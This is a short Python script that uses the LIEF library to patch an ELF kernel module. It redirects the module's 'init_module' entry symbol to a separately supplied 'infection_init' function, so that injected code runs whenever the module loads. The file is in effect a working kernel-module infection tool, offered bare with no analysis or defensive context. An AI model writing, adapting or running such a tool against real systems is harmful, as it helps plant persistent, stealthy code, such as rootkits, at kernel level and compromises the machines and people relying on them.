import sys
import lief
binary = lief.parse(sys.argv[2])

infection_init_name = sys.argv[1]

init_module = None
infection_init = None

for symbol in binary.symbols:
    match symbol.name:
        case 'init_module':
            init_module = symbol
        case str(infection_init_name):
            infection_init = symbol
        case _:
            continue

init_module.value = infection_init.value

binary.write(sys.argv[3])
